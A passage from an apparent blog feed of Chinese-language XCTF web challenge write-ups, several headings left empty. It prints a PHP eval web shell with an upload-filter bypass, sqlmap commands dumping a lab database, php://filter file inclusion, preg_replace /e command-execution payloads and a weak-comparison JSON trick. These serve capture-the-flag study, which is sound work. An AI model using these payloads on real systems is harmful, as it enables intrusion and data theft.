<span class="keyword">new</span> xctf();</span><br><span class="line">$a = serialize($a);</span><br><span class="line">print_r($a);</span><br><span class="line"><span class="comment">//$a = O:4:"xctf":1:&#123;s:4:"flag";s:3:"111";&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将序列化结果改为 <strong>O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}</strong> 即可</p><h1 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h1><p>文件上传，js前端验证后缀名，基于本地验证文件是否符合要求。直接将js禁用。或者burp抓包后修改后缀，将php文件后缀先改为jpg，burp抓包后改回php。</p><p>新建文件1.php，内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'shell'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>改名为1.jpg，然后上传，burp修改后缀，蚁剑连接。</p><h1 id="Confusion1"><a href="#Confusion1" class="headerlink" title="Confusion1"></a>Confusion1</h1><h1 id="Triangle"><a href="#Triangle" class="headerlink" title="Triangle"></a>Triangle</h1><h1 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h1><p>在URL栏fuzz URL得到如下结果：</p><p>1、正常URL，返回ping结果</p><p>2、非法URL(特殊符号)，返回Invalid URL</p><p>3、%80，返回Django报错</p><p>将报错信息保存为html，打开即为django报错页面</p><p>发现数据库路径</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_cat_1.png" alt></p><p>pyload：@/opt/api/database.sqlite3</p><p>保存为html文件，发现flag</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_cat_2.png" alt></p><p>总结：</p><p>当  <strong>CURLOPT_SAFE_UPLOAD</strong> 为 true 时，PHP 可以通过在参数中注入 <strong>@</strong> 来读取文件。</p><p>当且仅当文件中存在中文字符的时候，Django 才会报错导致获取文件内容。  </p><h1 id="wtf-sh-150"><a href="#wtf-sh-150" class="headerlink" title="wtf.sh-150"></a>wtf.sh-150</h1><h1 id="ics-04"><a href="#ics-04" class="headerlink" title="ics-04"></a>ics-04</h1><p>根据提示，可利用的页面有三个，分别为 login.php，register.php，findpwd.php</p><p>发现 findpwd.php 存在注入</p><p>sqlmap 一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python2 sqlmap.py -u <span class="string">"http://111.198.29.45:52139/findpwd.php"</span> --data <span class="string">"username=aaa"</span></span><br><span class="line"></span><br><span class="line"> python2 sqlmap.py -u <span class="string">"http://111.198.29.45:52139/findpwd.php"</span> --data <span class="string">"username=aaa"</span> --tables</span><br><span class="line"></span><br><span class="line">python2 sqlmap.py -u <span class="string">"http://111.198.29.45:52139/findpwd.php"</span> --data <span class="string">"username=aaa"</span> -D cetc004 -T user --dump</span><br></pre></td></tr></table></figure><p>得到用户信息</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/xctf_web/xctf_ics4_1.png" alt></p><p>这里又一个逻辑漏洞，可以覆盖已注册的用户，重新注册一下用户即可</p><h1 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h1><p>index.php?page=index</p><p>观察URL，明显是个文件包含</p><p>index.php?page=php://filter/convert.base64-encode/resource=index.php</p><p>读取index.php，关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line"></span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>X-Forwarded-For:127.0.0.1<br>/index.php?pat=/test/e&amp;rep=system(‘ls’);&amp;sub=test</p><p>/index.php?pat=/test/e&amp;rep=system(‘ls+-a+./s3chahahaDir’);&amp;sub=test</p><p>/index.php?<br>pat=/test/e&amp;rep=system(‘cat+./s3chahahaDir/flag/flag.php’);&amp;sub=test</p><p>遍历出目录，直接读取flag</p><p>总结：</p><p>preg_replace的 /e 模式会导致命令执行</p><h1 id="bug"><a href="#bug" class="headerlink" title="bug"></a>bug</h1><h1 id="i-got-id-200"><a href="#i-got-id-200" class="headerlink" title="i-got-id-200"></a>i-got-id-200</h1><h1 id="ics-07"><a href="#ics-07" class="headerlink" title="ics-07"></a>ics-07</h1><h1 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h1><h1 id="Guess"><a href="#Guess" class="headerlink" title="Guess"></a>Guess</h1><h1 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h1><p>打开robots.txt，发现是个.git源码泄露，githack下载源码，很明显，buy是最关键的部分</p><p>数据是通过json传输的，buy的数据格式就是{“action”:”buy”,”numbers”:”1234567”}</p><p>关键函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">buy</span><span class="params">($req)</span></span>&#123;</span><br><span class="line">require_registered();</span><br><span class="line">require_min_money(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">$money = $_SESSION[<span class="string">'money'</span>];</span><br><span class="line">$numbers = $req[<span class="string">'numbers'</span>];</span><br><span class="line">$win_numbers = random_win_nums();</span><br><span class="line">$same_count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;<span class="number">7</span>; $i++)&#123;</span><br><span class="line"><span class="keyword">if</span>($numbers[$i] == $win_numbers[$i])&#123;</span><br><span class="line">$same_count++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在一个弱类型比较，$numbers[$i] == $win_numbers[$i]，直接让传输的numbers全为true，即构造<strong>{“action”:”buy”,”numbers”:[true,true,true,true,true,true,true]}</strong>，刷金币购买flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;攻防世界 web 进阶题解&lt;/p&gt;
    
    </summary>
    
      <category term="CTF wp" scheme="http://yoursite.com/categories/CTF-wp/"/>
    
    
      <category term="wp" scheme="http://yoursite.com/tags/wp/"/>
    
      <category term="XCTF" scheme="http://yoursite.com/tags/XCTF/"/>
    
  </entry>
  
</feed>
